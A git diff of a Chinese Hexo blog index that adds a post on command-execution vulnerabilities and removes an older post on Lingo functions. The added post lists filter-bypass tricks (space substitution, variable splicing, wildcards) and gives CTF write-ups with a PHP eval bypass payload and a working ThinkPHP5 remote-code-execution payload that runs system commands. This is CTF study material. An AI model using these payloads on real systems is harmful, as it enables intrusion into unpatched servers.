@@ -177,6 +177,158 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/12/06/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="gorgeousdays">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/12/06/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="post-title-link" itemprop="url">命令执行漏洞</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-12-06 17:20:35 / 修改时间：17:21:20" itemprop="dateCreated datePublished" datetime="2020-12-06T17:20:35+08:00">2020-12-06</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%9D%82%E8%B0%88/" itemprop="url" rel="index"><span itemprop="name">杂谈</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h4 id="命令执行基础"><a href="#命令执行基础" class="headerlink" title="命令执行基础"></a>命令执行基础</h4><p>cmd与bash的一些规则</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th></th>
+<th>Windows</th>
+<th>Linux</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>转义字符</td>
+<td>^</td>
+<td>\</td>
+</tr>
+<tr>
+<td>多条命令执行</td>
+<td>&amp;&amp;、\</td>
+<td>\</td>
+<td>、%0a</td>
+<td>&amp;&amp;、\</td>
+<td>\</td>
+<td>、；、$()、``、%0a、%0d</td>
+</tr>
+<tr>
+<td>注释符号</td>
+<td>：：</td>
+<td>#</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>&amp;&amp;与||存在惰性原则，and一个不成立就不执行第二个，or若第一个成立也不执行第二个</p>
+<h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><h5 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h5><p>有时题目对过滤掉空格，于是我们可以采用以下方法来构造</p>
+<ol>
+<li>用<code>%00-%ff</code>区间的字符串测试，如<code>%09</code></li>
+<li>在windows下通过<code>%ProgramFiles:~10,1%</code>获取空格<br><code>~</code>为截取符<code>%ProgramFile%</code>一般为<code>C:Program Files</code>截取从第十个字符开始的一个字符，即为空格</li>
+<li>Linux下<ul>
+<li><code>$IFS$9</code></li>
+<li><code>&#123;cmd,args&#125;</code>  对<code>bash</code>有效，对<code>zsh、dash</code>无效</li>
+<li><code>cat&lt;&gt;flag</code>  读取文件时</li>
+<li>e.g.<code>echo$IF$9aaaa</code>    <code>&#123;echo,aaaa&#125;</code></li>
+</ul>
+</li>
+</ol>
+<h5 id="黑名单关键字"><a href="#黑名单关键字" class="headerlink" title="黑名单关键字"></a>黑名单关键字</h5><p>有时题目对过滤掉<code>cat flag</code>等关键字，于是我们可以采用以下方法来构造</p>
+<ol>
+<li><p><strong>变量拼接</strong>  <code>Linux:a=c;b=at;c=he;d=llo;$a$b $&#123;c&#125;$&#123;d&#125;</code><br>给变量重新赋值 拼接后为<code>cat flag</code></p>
+</li>
+<li><p><strong>使用通配符</strong>  <code>Linux:cat /tm?/fl*</code>    <code>Windows:type fla*</code><br>?代表任意一个字符串，*则代表任意个字符创</p>
+</li>
+<li><p><strong>借用已有字符串</strong> 如果禁用<code>&lt;&gt;?</code>等字符串，则可以借用其他文件中的字符串，利用<code>substr()</code>函数来截取某个特定字符串。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:cat test.php</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="built_in">echo</span> test.php;</span><br><span class="line">?&gt;</span><br><span class="line">root@kali:<span class="built_in">echo</span> `expr substr $(awk NR==1 test.php) 1 1`</span><br><span class="line">&lt;</span><br><span class="line">root@kali:<span class="built_in">echo</span> `expr substr $(awk NR==3 test.php) 2 1`</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h5 id="执行无回显"><a href="#执行无回显" class="headerlink" title="执行无回显"></a>执行无回显</h5><ol>
+<li>HTTP通道</li>
+<li>DNS通道</li>
+<li>时间盲注</li>
+<li>写入文件，二次返回</li>
+</ol>
+<h4 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h4><h5 id="GitHack"><a href="#GitHack" class="headerlink" title="GitHack"></a><a target="_blank" rel="noopener" href="https://github.com/lijiejie/GitHack">GitHack</a></h5><p>存在git泄露 扫码网站得到index.php</p>
+<h5 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>先传入参数<code>exp</code>，第一个和第三个if过滤掉了协议以及关键词</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[a-z,_]+\((?R)?\)&#x2F;&#39;, NULL, $_GET[&#39;exp&#39;]))</span><br></pre></td></tr></table></figure>
+<p>第二个if表明所给的<code>exp</code>在去掉字母括号后为<code>;</code></p>
+<h5 id="构造"><a href="#构造" class="headerlink" title="构造."></a>构造<code>.</code></h5><p>源码在<code>flag.php</code>中</p>
+<p>我们可以通过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">print_r(scandir(<span class="string">&#x27;.&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>来扫码当前目录下的文件，但是<code>.</code>符号已经被过滤</p>
+<p>于是我们可以构造<code>.</code>号，有以下两种方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())));</span><br><span class="line">print_r(scandir(pos(localeconv())));</span><br></pre></td></tr></table></figure>
+<p>从而获取到了5个文件，<code>flag.php</code>为数组的倒数第二个元素</p>
+<h5 id="获取falg-php"><a href="#获取falg-php" class="headerlink" title="获取falg.php"></a>获取falg.php</h5><p>为了获取倒数第二个元素，我们可以通过<code>array_rand(array_filp())</code>随机从数组中取值。其中<code>array_flip()</code>交换数组的键和值，<code>array_rand()</code>从数组中随机取出一个或多个单元。</p>
+<p>构造<code>payload</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
+<p>由于是随机取值，多刷新几遍网页就可以得到flag</p>
+<h4 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h4><p>发现网页由THINKPHP5驱动，发现其存在<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3845">漏洞</a>,即可通过Post操作传入下列参数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;server[REQUEST_METHOD]&#x3D;</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;</span><br></pre></td></tr></table></figure>
+<p>这是应对漏洞的一种格式固定的操作。有以上两种方法。等号后面跟的是命令。</p>
+<p>先传参查看目录结构</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;server[REQUEST_METHOD]&#x3D;ls</span><br></pre></td></tr></table></figure>
+<p>后获取flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/11/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1201,100 +1353,6 @@ M_2=\frac{2a^3bC^2-b^4+C_1b}{aC_1-a^4C_2+2ab^3}=\frac{b}{a}\frac{C_1+2a^3C_2-b^3
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/09/09/lingo%E7%AC%94%E8%AE%B0-lingo%E5%87%BD%E6%95%B0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="gorgeousdays">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/09/09/lingo%E7%AC%94%E8%AE%B0-lingo%E5%87%BD%E6%95%B0/" class="post-title-link" itemprop="url">Lingo函数</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2020-09-09 20:17:05 / 修改时间：20:18:26" itemprop="dateCreated datePublished" datetime="2020-09-09T20:17:05+08:00">2020-09-09</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Lingo/" itemprop="url" rel="index"><span itemprop="name">Lingo</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h4 id="1-基本运算符"><a href="#1-基本运算符" class="headerlink" title="1.基本运算符"></a>1.基本运算符</h4><h5 id="1-1算数运算符"><a href="#1-1算数运算符" class="headerlink" title="1.1算数运算符"></a>1.1算数运算符</h5><p>-(取反)  ^  *  /  +  -</p>
-<h5 id="1-2-逻辑运算符"><a href="#1-2-逻辑运算符" class="headerlink" title="1.2.逻辑运算符"></a>1.2.逻辑运算符</h5><p>返回true或false</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">优先级排列</span><br><span class="line"><span class="meta">#not#  一元运算符,否定操作数的逻辑值</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#eq#   两个运算数相等返回ture 不等返回flase</span></span><br><span class="line"><span class="meta">#ne#   ≠</span></span><br><span class="line"><span class="meta">#gt#   &gt;</span></span><br><span class="line"><span class="meta">#ge#   ≥</span></span><br><span class="line"><span class="meta">#lt#   &lt;   </span></span><br><span class="line"><span class="meta">#le#   ≤</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#and#  都为true返回true</span></span><br><span class="line"><span class="meta">#or#   都为false返回false，其余情况返回true</span></span><br></pre></td></tr></table></figure>
-<h5 id="1-3-关系运算符"><a href="#1-3-关系运算符" class="headerlink" title="1.3 关系运算符"></a>1.3 关系运算符</h5><p>Lingo有三种关系运算符：“=”、“&lt;=”和“&gt;=”。</p>
-<p>Lingo中还能用“&lt;”表示小于等于关系，“&gt;”表示大于等于关系。但Lingo并不严格支持大于与小于关系，于是，为了A&lt;B成立，可以将其变为小于等于表达式$A+\xi\le B$,其中$\xi$为一个很小的正数，它的值依赖于模型中A小于B多少算不等。</p>
-<h5 id="1-4-运算符优先级排列"><a href="#1-4-运算符优先级排列" class="headerlink" title="1.4 运算符优先级排列"></a>1.4 运算符优先级排列</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#not# -(取反)</span><br><span class="line">^</span><br><span class="line">* &#x2F;</span><br><span class="line">+ -</span><br><span class="line">#eq# #ne# #gt# #ge# #lt# #le#</span><br><span class="line">#and# #or#</span><br><span class="line">&lt;&#x3D; &#x3D; &gt;&#x3D;</span><br></pre></td></tr></table></figure>
-<h4 id="2-数学函数"><a href="#2-数学函数" class="headerlink" title="2.数学函数"></a>2.数学函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">abs</span>(x) @<span class="built_in">sin</span>(x) @<span class="built_in">cos</span>(x) @<span class="built_in">tan</span>(x) mod(x,y) <span class="built_in">pow</span>(x,y) <span class="built_in">sqrt</span>(x)</span><br><span class="line">@<span class="built_in">exp</span>(x) <span class="comment">//返回常数e的x次方</span></span><br><span class="line">@<span class="built_in">log</span>(x) <span class="comment">//返回x的自然对数</span></span><br><span class="line">@lgm(x) <span class="comment">//返回x的gamma函数的自然对数</span></span><br><span class="line">@sign(x) <span class="comment">//如果 x&lt;0 返回-1；否则，返回 1</span></span><br><span class="line">@<span class="built_in">floor</span>(x) <span class="comment">//取整。当 x&gt;=0 时，返回不超过 x 的最大整数；当 x&lt;0时，返回不低于 x 的最大整数。</span></span><br><span class="line">@smax(x1,x2...xn) <span class="comment">//最大值</span></span><br><span class="line">@smin(x1,x2...xn) <span class="comment">//最小值</span></span><br></pre></td></tr></table></figure>
-<h4 id="3-金融函数"><a href="#3-金融函数" class="headerlink" title="3.金融函数"></a>3.金融函数</h4><h5 id="3-1-fpa-I-n"><a href="#3-1-fpa-I-n" class="headerlink" title="3.1 @fpa(I,n)"></a>3.1 @fpa(I,n)</h5><p>返回一个净现值，其单位时间利率为I，连续支付n个时间段，该支付所对应的净现值。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">贷款金额 <span class="number">50000</span> 元，贷款年利率 <span class="number">5.31</span>%，采取分期付款方式（每年年末还固定金额，直至还清）。问拟贷款 <span class="number">10</span> 年，每年需偿还多少元？</span><br><span class="line"></span><br><span class="line"><span class="number">50000</span> = x * @fpa(<span class="number">.0531</span>,<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">解得X=<span class="number">6573.069</span></span><br></pre></td></tr></table></figure>
-<h5 id="3-2-fpl-I-n"><a href="#3-2-fpl-I-n" class="headerlink" title="3.2 @fpl(I,n)"></a>3.2 @fpl(I,n)</h5><p>返回一个净现值，单位时段利率为 I，第 n 个时段支付单位费用。</p>
-<script type="math/tex; mode=display">
-两函数关系:\quad@fpa(I,n)=\sum_{k=1}^n@fpl(I,k)</script><h4 id="4-概率函数"><a href="#4-概率函数" class="headerlink" title="4.概率函数"></a>4.概率函数</h4><p>@pbn(p,n,x)  二项分布的累积分布函数。当 n 和（或）x 不是整数时，用线性插值法进行计算。</p>
-<p>@pcx(n,x) </p>
-<p>@peb(a,x)</p>
-<p>……</p>
-<h4 id="5-变量界定函数"><a href="#5-变量界定函数" class="headerlink" title="5.变量界定函数"></a>5.变量界定函数</h4><p>变量界定函数对变量的取值范围附加限制</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//通常情况下Lingo规定变量非负，可以通过@free和@bnd取消该设定</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@bin(x) 限制x为<span class="number">0</span>或<span class="number">1</span></span><br><span class="line">@bnd(L,x,U) 限制L≤x≤U</span><br><span class="line">@<span class="built_in">free</span>(x) 取消对变量x的默认下界为<span class="number">0</span>的限制，即x可以取任意实数</span><br><span class="line">@gin(x) 限制x为整数</span><br></pre></td></tr></table></figure>
-<h4 id="6-集操作函数"><a href="#6-集操作函数" class="headerlink" title="6.集操作函数"></a>6.集操作函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>． </span><br><span class="line">   @in(set_name,primitive_index_1 [,primitive_index_2,„])   </span><br><span class="line">   如果元素位于指定集中，返回<span class="number">1</span>；否则返回<span class="number">0</span></span><br><span class="line">eg.    </span><br><span class="line">   I为全集，B为I的子集，C为B的补集</span><br><span class="line">   sets:</span><br><span class="line">      I/x1..x4/;</span><br><span class="line">      B(I)/x2/;</span><br><span class="line">      C(I)|<span class="meta">#not#@in(B,&amp;1):;</span></span><br><span class="line">   endsets</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span></span><br><span class="line">   @index([set_name,] primitive_set_element)    </span><br><span class="line">   返回在集中原始集成员的索引。如果 set_name被忽略，那么 Lingo 将返回与 所给参数匹配的第一个原始集成员的索引。</span><br><span class="line">   如果找不到，则报错。</span><br><span class="line">eg.</span><br><span class="line">   确定(B,Y)属于派生集S3</span><br><span class="line">   sets:</span><br><span class="line">      S1/A B C/;</span><br><span class="line">      S2/X Y Z/;</span><br><span class="line">      S3(S1,S2)/A X, A Z, B Y, C X/;</span><br><span class="line">   endsets</span><br><span class="line">   X=@in(S3,@index(S1,B),@index(S2,Y)); 返回<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="number">3.</span></span><br><span class="line">    @wrap(index,limit)</span><br><span class="line">    该函数返回j=index-k*limit。相当于index模limit，如果取模结果不等于<span class="number">0</span>，就返回该结果，否则返回limit。</span><br><span class="line">    参考: https:<span class="comment">//www.docin.com/p-1185198022.html  </span></span><br><span class="line">       </span><br><span class="line"><span class="number">4.</span>  </span><br><span class="line">    @size(set_name)  </span><br><span class="line">    返回集set_name中的成员个数</span><br><span class="line">       </span><br></pre></td></tr></table></figure>
-<h4 id="7-集循环函数"><a href="#7-集循环函数" class="headerlink" title="7.集循环函数"></a>7.集循环函数</h4><h5 id="7-1-基本语法"><a href="#7-1-基本语法" class="headerlink" title="7.1 基本语法"></a>7.1 基本语法</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">@function(setname[(set_index_list)[|conditional_qualifier]]:expression_list);</span><br><span class="line">其中function为以下四个函数</span><br><span class="line"></span><br><span class="line">1.@for</span><br><span class="line">  model:</span><br><span class="line">  sets:</span><br><span class="line">    number&#x2F;1..5&#x2F;:x;</span><br><span class="line">  endsets</span><br><span class="line">    @for(number(I): x(I)&#x3D;I^2);</span><br><span class="line">  end</span><br><span class="line">  </span><br><span class="line">2.@sum</span><br><span class="line">  model:</span><br><span class="line">  data:</span><br><span class="line">    N&#x3D;6;</span><br><span class="line">  enddata</span><br><span class="line">  sets:</span><br><span class="line">    number&#x2F;1..N&#x2F;:x;</span><br><span class="line">  endsets</span><br><span class="line">  data:</span><br><span class="line">    x &#x3D; 5 1 3 4 6 10;</span><br><span class="line">  enddata</span><br><span class="line">    s&#x3D;@sum(number(I) | I #le# 5: x);</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">3.@min和@max 返回指定的集成员的一个表达式的最小值或最大值</span><br><span class="line">  model:</span><br><span class="line">  data:</span><br><span class="line">    N&#x3D;6;</span><br><span class="line">  enddata</span><br><span class="line">  sets:</span><br><span class="line">    number&#x2F;1..N&#x2F;:x;</span><br><span class="line">  endsets</span><br><span class="line">  data:</span><br><span class="line">    x &#x3D; 5 1 3 4 6 10;</span><br><span class="line">  enddata</span><br><span class="line">    minv&#x3D;@min(number(I) | I #le# 5: x);</span><br><span class="line">    maxv&#x3D;@max(number(I) | I #ge# N-2: x);</span><br><span class="line">  end</span><br></pre></td></tr></table></figure>
-<h4 id="8-输入和输出函数"><a href="#8-输入和输出函数" class="headerlink" title="8.输入和输出函数"></a>8.输入和输出函数</h4><p>@flie 从外部文件中输入数据  </p>
-<p>@text  输出操作</p>
-<p>@ole 是从 EXCEL 中引入或输出数据的接口函数</p>
-<p>@ranged(variable_or_row_name)</p>
-<p>@rangeu(variable_or_row_name)</p>
-<p>@status()</p>
-<p>@dual</p>
-<h4 id="9-辅助函数"><a href="#9-辅助函数" class="headerlink" title="9.辅助函数"></a>9.辅助函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1.</span><br><span class="line">  @if(logical_condition,true_result,false_result)</span><br><span class="line">  如果逻辑表达式为true，则返回true_result,否则返回false_result</span><br><span class="line">eg.</span><br><span class="line">  model:</span><br><span class="line">    min&#x3D;fx+fy;</span><br><span class="line">    fx&#x3D;@if(x #gt# 0, 100,0)+2*x;</span><br><span class="line">    fy&#x3D;@if(y #gt# 0,60,0)+3*y;</span><br><span class="line">    x+y&gt;&#x3D;30;</span><br><span class="line">  end</span><br><span class="line">  </span><br><span class="line">2.</span><br><span class="line">  @warn(’text’,logical_condition)</span><br><span class="line">  如果逻辑表达式为true，则产生内容为text的消息框</span><br><span class="line">eg.</span><br><span class="line">  model:</span><br><span class="line">    x&#x3D;1;</span><br><span class="line">    @warn(&#39;x 是正数&#39;,x #gt# 0); </span><br><span class="line">  end</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1366,7 +1424,7 @@ M_2=\frac{2a^3bC^2-b^4+C_1b}{aC_1-a^4C_2+2ab^3}=\frac{b}{a}\frac{C_1+2a^3C_2-b^3
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">28</span>
+          <span class="site-state-item-count">29</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
